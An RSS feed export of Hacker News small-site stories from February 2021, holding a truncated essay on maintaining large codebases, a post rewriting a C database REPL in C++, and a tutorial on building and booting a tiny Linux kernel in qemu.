<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 16 Feb 2021 04:34:13 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 16 Feb 2021 04:34:13 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[On Navigating a Large Codebase]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I’ve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I’ve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I’ve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100’000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn’t fit
into the rest of the system. You might also know this situation under the term of
“those people had no idea what they were doing, and we will do it right this time” which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it’s likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn’t gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can’t just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I’ve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It’s fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it’s how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and “SOLID” code.</p><blockquote><p>Why IBM sales reps don’t have children?</p><p>Because all they do is sit on the bed telling their spouses how great it’s going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don’t stand
the heat of the battle, but that doesn’t bother the modelers who will try to fix
the problems with more obfuscation patterns. It’s how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude’s hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it’s entirely unusable for this use case. The Word doesn’t support syntax highlighting for
code snippets and you get to play the game of “moving one image for 5 pixels to the
left will mess with your headings and right align all text.”
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it’s also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it’s worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don’t completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Setting up a Better REPL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129179">thread link</a>) | @downvotemore
<br/>
February 13, 2021 | https://mikeloomisgg.github.io/2019-04-10-set-up-repl/ | <a href="https://web.archive.org/web/*/https://mikeloomisgg.github.io/2019-04-10-set-up-repl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-set-up-repl" class="page" role="article"><header><p> <time datetime="2019-04-10T00:00:00+00:00">10 Apr 2019</time> on <a href="https://mikeloomisgg.github.io/tag/cpp/">c++</a>, <a href="https://mikeloomisgg.github.io/tag/database/">Databases</a></p></header><p>One of the very common criticisms of c++ is that it is very complicated. I saw someone on a programming stream yesterday claim that they prefer raw c because it feels more <em>intuitive</em>. To me, this just seems out of touch with reality. Lets look at the simplest REPL, from <a href="https://cstack.github.io/db_tutorial/parts/part1.html">part 1</a> of the cstack database from scratch series. I think by the end anyone would agree with me that the c++ version of this code is better in every way to its c counterpart.</p><p>What we are creating here, REPL for short, is a very common introductory tool for someone just getting used to working with a SQL database. It allows a beginner user to interact with the database line by line, discovering how SQL works through tinkering with the language. Many of these REPL shells are also used in scripting languages, and its the default mode that python starts in if you pass it no arguments.</p><p>In this part, we are just looking at the simplest REPL ever, which just prompts the user with some context in the terminal, and allows lines of input to be evaluated. The only command we are evaluating for now is just the SQL .exit metacommand. Any other commands passed to our program are unrecognized. Here is the c version:</p><div><div><pre><code><span>#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span>struct</span> <span>InputBuffer_t</span> <span>{</span>
  <span>char</span><span>*</span> <span>buffer</span><span>;</span>
  <span>size_t</span> <span>buffer_length</span><span>;</span>
  <span>ssize_t</span> <span>input_length</span><span>;</span>
<span>};</span>
<span>typedef</span> <span>struct</span> <span>InputBuffer_t</span> <span>InputBuffer</span><span>;</span>

<span>InputBuffer</span><span>*</span> <span>new_input_buffer</span><span>()</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>InputBuffer</span><span>));</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer_length</span> <span>=</span> <span>0</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>0</span><span>;</span>

  <span>return</span> <span>input_buffer</span><span>;</span>
<span>}</span>

<span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>

<span>void</span> <span>read_input</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
  <span>ssize_t</span> <span>bytes_read</span> <span>=</span>
      <span>getline</span><span>(</span><span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>),</span> <span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer_length</span><span>),</span> <span>stdin</span><span>);</span>

  <span>if</span> <span>(</span><span>bytes_read</span> <span>&lt;=</span> <span>0</span><span>)</span> <span>{</span>
    <span>printf</span><span>(</span><span>"Error reading input</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>// Ignore trailing newline
</span>  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>bytes_read</span> <span>-</span> <span>1</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>[</span><span>bytes_read</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
<span>}</span>

<span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>print_prompt</span><span>();</span>
    <span>read_input</span><span>(</span><span>input_buffer</span><span>);</span>

    <span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
      <span>close_input_buffer</span><span>(</span><span>input_buffer</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>printf</span><span>(</span><span>"Unrecognized command '%s'.</span><span>\n</span><span>"</span><span>,</span> <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Here’s a whole mess of things that a modern Rust or C++ developer cringe at.</p><ul><li>Using malloc to allocate memory for an input buffer</li><li>Using a strcmp free function to deep compare equality of raw buffers.</li><li>Manually freeing the memory allocated for the input buffer after we’re done.</li></ul><p>This isn’t fast, and it isn’t intuitive. Its also 56 lines of code with a large amount of boilerplate code for handling memory allocation.</p><p>Lets break this down into a much simpler and more intuitive c++ alternative step by step.</p><div><div><pre><code><span>//Replace this input buffer pointer with a std::string
</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
</code></pre></div></div><div><div><pre><code><span>// Our single line prompt function doesn't need to call an external free function
// Get rid of the free function 
</span><span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>
</code></pre></div></div><div><div><pre><code><span>/// strcmp is unnecessary if we're using the std::string type which has overloaded the == operator for string literals
</span><span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
</code></pre></div></div><div><div><pre><code><span>// malloc and free are code smells. Like new and delete, they should not exist in modern c++ code.
</span><span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>
</code></pre></div></div><p>Here is our nearly identical c++ version with those simplifications:</p><div><div><pre><code><span>#include &lt;iostream&gt;
#include &lt;string&gt;
</span>
<span>int</span> <span>main</span><span>()</span> <span>{</span>
  <span>std</span><span>::</span><span>string</span> <span>input</span><span>;</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"db &gt; "</span><span>;</span>
    <span>std</span><span>::</span><span>getline</span><span>(</span><span>std</span><span>::</span><span>cin</span><span>,</span> <span>input</span><span>);</span>

    <span>if</span><span>(</span><span>input</span> <span>==</span> <span>".exit"</span><span>)</span> <span>{</span>
      <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Unrecognized command: "</span> <span>&lt;&lt;</span> <span>input</span> <span>&lt;&lt;</span> <span>'\n'</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Compare the two different versions’ disassembly on a website like https://godbolt.org/ and we can see that the c++ version very similar and potentially faster than the raw c version.</p><table><thead><tr><th>&nbsp;</th><th>c</th><th>c++</th></tr></thead><tbody><tr><td>Lines of code</td><td>56</td><td>15</td></tr><tr><td>Disassembly length</td><td>99</td><td>99</td></tr><tr><td>Potential bugs</td><td>Infinite chances of memory leaks</td><td>Impossible to leak with RAII types on the stack</td></tr></tbody></table><p>This very simple REPL for part 1 perfectly illustrates how insane people sound to me when they claim that c is simpler or more intuitive than c++. In this simple case, c++ is approximately as easy to write and understand as a high level scripting language like python, but compiles down to a smaller binary than c.</p><p>This post is part of a series which I am going to go through step by step simplifying and converting the cstack sqlite database into a more modern c++ version. So stay tuned for the next parts where we’ll discuss:</p><ul><li>Better REPL parser implementations</li><li>Test Driven Developement in Practice</li><li>Database structure and persistence</li><li>A look at B-Trees</li></ul></article></div>]]>
            </description>
            <link>https://mikeloomisgg.github.io/2019-04-10-set-up-repl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129179</guid>
            <pubDate>Sun, 14 Feb 2021 02:37:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Tiny Linux Kernel]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129094">thread link</a>) | @mmphosis
<br/>
February 13, 2021 | https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d | <a href="https://web.archive.org/web/*/https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><div><a href="https://medium.com/@anuradha?source=post_page-----8c07579ae79d--------------------------------" rel="noopener"><div><p><img alt="Anuradha Weeraman" src="https://miro.medium.com/fit/c/96/96/1*Lmj25yY1HRAVGeWBkpWIWQ.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div><p id="270a">Today we will go over the process of building a tiny Linux kernel, and booting into a shell. To start with, fetch the Linux source tree that you’d like to try this out on. I’m using staging tree for this post. You can get it here:</p><pre><span id="fd32">$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/staging.git</span></pre><p id="2ba7">To get an initial config that’s very minimalist:</p><pre><span id="8a0c">$ make tinyconfig</span></pre><p id="6abf">Here’s a comparison of the config options enabled by tinyconfig to a stock kernel that come with my Debian distribution:</p><pre><span id="79de">$ grep "=y" .config | wc -l<br>247<br>$ grep "=m" .config | wc -l<br>0<br>$ grep "=y" /boot/config-5.4.0-4-amd64 | wc -l<br>2071<br>$ grep "=m" /boot/config-5.4.0-4-amd64 | wc -l<br>3401</span></pre><p id="0903">Let’s try to build it:</p><pre><span id="b16b">$ time make -j16<br>scripts/kconfig/conf  --syncconfig Kconfig<br>  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h<br>  WRAP    arch/x86/include/generated/uapi/asm/bpf_perf_event.h<br>.<br>.<br>.<br>.<br>Setup is 13788 bytes (padded to 13824 bytes).<br>System is 417 kB<br>CRC 435fb428<br>Kernel: arch/x86/boot/bzImage is ready  (#1)</span><span id="b15f">real 0m15.468s<br>user 2m12.094s<br>sys 0m14.603s</span></pre><p id="3536">The kernel builds to around ~430k. This is a 32-bit kernel by default, so let’s enable 64-bit support:</p><pre><span id="3ec0">$ make menuconfig</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3790/1*Qqz6S1F0iuHYvkh3La7L7Q.png" width="1895" height="1006" srcset="https://miro.medium.com/max/552/1*Qqz6S1F0iuHYvkh3La7L7Q.png 276w, https://miro.medium.com/max/1104/1*Qqz6S1F0iuHYvkh3La7L7Q.png 552w, https://miro.medium.com/max/1280/1*Qqz6S1F0iuHYvkh3La7L7Q.png 640w, https://miro.medium.com/max/1400/1*Qqz6S1F0iuHYvkh3La7L7Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Qqz6S1F0iuHYvkh3La7L7Q.png?q=20"></p></div></div></div></figure><p id="94ce">Enable the TTY for console support:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3800/1*98FOepVg-qylMCy2fTBx0Q.png" width="1900" height="1007" srcset="https://miro.medium.com/max/552/1*98FOepVg-qylMCy2fTBx0Q.png 276w, https://miro.medium.com/max/1104/1*98FOepVg-qylMCy2fTBx0Q.png 552w, https://miro.medium.com/max/1280/1*98FOepVg-qylMCy2fTBx0Q.png 640w, https://miro.medium.com/max/1400/1*98FOepVg-qylMCy2fTBx0Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*98FOepVg-qylMCy2fTBx0Q.png?q=20"></p></div></div></div></figure><p id="8c6a">and support for printk to see console output as the kernel boots:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3796/1*fKls0hD5lYLYd579TRKgKQ.png" width="1898" height="1010" srcset="https://miro.medium.com/max/552/1*fKls0hD5lYLYd579TRKgKQ.png 276w, https://miro.medium.com/max/1104/1*fKls0hD5lYLYd579TRKgKQ.png 552w, https://miro.medium.com/max/1280/1*fKls0hD5lYLYd579TRKgKQ.png 640w, https://miro.medium.com/max/1400/1*fKls0hD5lYLYd579TRKgKQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*fKls0hD5lYLYd579TRKgKQ.png?q=20"></p></div></div></div></figure><p id="9a2e">Build again:</p><pre><span id="f1eb">Setup is 13596 bytes (padded to 13824 bytes).<br>System is 737 kB<br>CRC d273f4d<br>Kernel: arch/x86/boot/bzImage is ready  (#4)</span><span id="1a1b">real 0m6.045s<br>user 0m40.808s<br>sys 0m3.958s</span></pre><p id="371e">The size has gone up somewhat, nearly double what we started off with. If you’re only supporting a serial interface, even this additional bloat can be avoided to keep the size of the image down.</p><p id="ea7f">Boot the kernel with qemu:</p><pre><span id="6b5b">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*QfIoYrTIpWEIBD0ZETpx4w.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*QfIoYrTIpWEIBD0ZETpx4w.png 276w, https://miro.medium.com/max/1104/1*QfIoYrTIpWEIBD0ZETpx4w.png 552w, https://miro.medium.com/max/1280/1*QfIoYrTIpWEIBD0ZETpx4w.png 640w, https://miro.medium.com/max/1400/1*QfIoYrTIpWEIBD0ZETpx4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*QfIoYrTIpWEIBD0ZETpx4w.png?q=20"></p></div></div></div></figure><p id="0ef2">The kernel boots and panics when attempting to start init, as expected. In order to boot into a shell as we originally set out to do, we will need a filesystem and a shell that can be started by the kernel as PID 1. Let us create a bare bones ram disk image that we can use to boot into a minimal busybox shell.</p><p id="259d">There are plenty of ways to achieve this, and here’s just one way:</p><pre><span id="6e90">$ git clone <a href="mailto:git@github.com" rel="noopener">git@github.com</a>:aweeraman/kernel-utils.git<br>$ kernel-utils/create-initrd.sh <br>Creating initrd filesystem... ok<br>Building dependencies... <br>Cloning into 'busybox'...<br>remote: Enumerating objects: 29, done.<br>remote: Counting objects: 100% (29/29), done.<br>remote: Compressing objects: 100% (23/23), done.<br>remote: Total 110424 (delta 16), reused 14 (delta 6), pack-reused 110395<br>Receiving objects: 100% (110424/110424), 37.05 MiB | 5.40 MiB/s, done.<br>Resolving deltas: 100% (87061/87061), done.<br>Building initrd... 4882 blocks</span></pre><p id="d743">Before we can use this ram disk, we need to enable init RAM disk (initrd) support in the kernel:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3802/1*pBLJG65lMbzCEhUxfdyhzQ.png" width="1901" height="1009" srcset="https://miro.medium.com/max/552/1*pBLJG65lMbzCEhUxfdyhzQ.png 276w, https://miro.medium.com/max/1104/1*pBLJG65lMbzCEhUxfdyhzQ.png 552w, https://miro.medium.com/max/1280/1*pBLJG65lMbzCEhUxfdyhzQ.png 640w, https://miro.medium.com/max/1400/1*pBLJG65lMbzCEhUxfdyhzQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*pBLJG65lMbzCEhUxfdyhzQ.png?q=20"></p></div></div></div></figure><p id="0abf">I have only included support for gzip compression and disabled the rest.</p><p id="ca12">We will also need to enable ELF-support to be able to start up the shell:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3792/1*ul_vqh5YRC4YP7j0QRKuWA.png" width="1896" height="1009" srcset="https://miro.medium.com/max/552/1*ul_vqh5YRC4YP7j0QRKuWA.png 276w, https://miro.medium.com/max/1104/1*ul_vqh5YRC4YP7j0QRKuWA.png 552w, https://miro.medium.com/max/1280/1*ul_vqh5YRC4YP7j0QRKuWA.png 640w, https://miro.medium.com/max/1400/1*ul_vqh5YRC4YP7j0QRKuWA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ul_vqh5YRC4YP7j0QRKuWA.png?q=20"></p></div></div></div></figure><p id="1395">This time, when booting the kernel, pass in the -initrd argument and specify the initrd image that we created earlier, in addition to an argument to the kernel to specify the binary that it should look for in the ram disk and execute once the kernel has finished booting, which is in this case is ‘/bin/sh’.</p><pre><span id="fee5">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh"</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*0a_JKjSCmrnPPp4cXeu6Qg.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*0a_JKjSCmrnPPp4cXeu6Qg.png 276w, https://miro.medium.com/max/1104/1*0a_JKjSCmrnPPp4cXeu6Qg.png 552w, https://miro.medium.com/max/1280/1*0a_JKjSCmrnPPp4cXeu6Qg.png 640w, https://miro.medium.com/max/1400/1*0a_JKjSCmrnPPp4cXeu6Qg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*0a_JKjSCmrnPPp4cXeu6Qg.png?q=20"></p></div></div></div></figure><p id="8c0d">And we have a shell.</p><p id="2c42">Let’s enable the /proc filesystem so we can run some standard commands:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3788/1*xEFVIfD0rrdra5ox2z86mA.png" width="1894" height="1008" srcset="https://miro.medium.com/max/552/1*xEFVIfD0rrdra5ox2z86mA.png 276w, https://miro.medium.com/max/1104/1*xEFVIfD0rrdra5ox2z86mA.png 552w, https://miro.medium.com/max/1280/1*xEFVIfD0rrdra5ox2z86mA.png 640w, https://miro.medium.com/max/1400/1*xEFVIfD0rrdra5ox2z86mA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*xEFVIfD0rrdra5ox2z86mA.png?q=20"></p></div></div></div></figure><p id="9333">Mount the proc file system after booting, so you can use commands like ‘ps’ and ‘free’:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*lB3Pk16_27Xd402yxPnNdw.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*lB3Pk16_27Xd402yxPnNdw.png 276w, https://miro.medium.com/max/1104/1*lB3Pk16_27Xd402yxPnNdw.png 552w, https://miro.medium.com/max/1280/1*lB3Pk16_27Xd402yxPnNdw.png 640w, https://miro.medium.com/max/1400/1*lB3Pk16_27Xd402yxPnNdw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*lB3Pk16_27Xd402yxPnNdw.png?q=20"></p></div></div></div></figure><p id="6e5c">Here’s the size of the kernel that we just built:</p><pre><span id="a064">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 793 kB</span></pre><p id="de47">Note that this is the size of the compressed kernel on disk and the actual memory used at boot time is comparable to the size of the generated vmlinux file, which in this case is 12MB. You would need at least that much memory to load the kernel into memory, plus 8–16MB additionally for the user space. Here’s the minimum memory configuration that allowed me to boot this kernel in qemu:</p><pre><span id="483d">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh" -m 29M</span></pre><p id="625a">Just for kicks, I disabled printk and booted up the kernel, that put me into a shell almost immediately:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*qRFHRgS6qYUoV2GqJhTjUA.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*qRFHRgS6qYUoV2GqJhTjUA.png 276w, https://miro.medium.com/max/1104/1*qRFHRgS6qYUoV2GqJhTjUA.png 552w, https://miro.medium.com/max/1280/1*qRFHRgS6qYUoV2GqJhTjUA.png 640w, https://miro.medium.com/max/1400/1*qRFHRgS6qYUoV2GqJhTjUA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*qRFHRgS6qYUoV2GqJhTjUA.png?q=20"></p></div></div></div></figure><p id="c8b4">Finally, the compressed kernel size comes down to:</p><pre><span id="d1b9">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 749 kB</span></pre></div></div></section></div></div>]]>
            </description>
            <link>https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129094</guid>
